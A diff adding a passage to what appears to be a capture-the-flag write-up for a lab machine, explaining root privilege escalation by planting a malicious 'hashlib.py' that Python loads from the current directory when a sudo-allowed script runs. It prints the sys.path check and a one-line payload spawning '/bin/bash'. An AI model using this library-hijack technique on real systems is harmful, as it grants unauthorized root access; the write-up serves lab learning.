@@ -678,7 +678,7 @@ User richard may run the following commands on stratosphere:
 
 <br />
 
-We can run a Python Script, let's take a look at what it does:
+We can run a Python Script as root without introduce a password, let's take a look at what it does:
 
 <br />
 
@@ -722,3 +722,34 @@ def question():
 
 question()
 ```
+
+<br />
+
+The script that we can execute imports a `Python Module`, this is quite critical since as we know, the `Python Path` begins to `search` the `library` by the `current route` ('',).
+
+<br />
+
+```bash
+richard@stratosphere:~$ python3 -c 'import sys; print(sys.path)'
+['', '/usr/lib/python37.zip', '/usr/lib/python3.7', '/usr/lib/python3.7/lib-dynload', '/usr/local/lib/python3.7/dist-packages', '/usr/lib/python3/dist-packages']
+```
+
+<br />
+
+So if we `create` a the `hashlib.py` module in the `current route` with malicious code, `root` is going to `execute it` when we run the `test.py`. Let's do it!!
+
+<br />
+
+`Malicious exploit.py Content:`
+
+<br />
+
+```python
+#!/usr/bin/env python3
+
+import os
+
+os.system('/bin/bash')
+```
+
+<br />
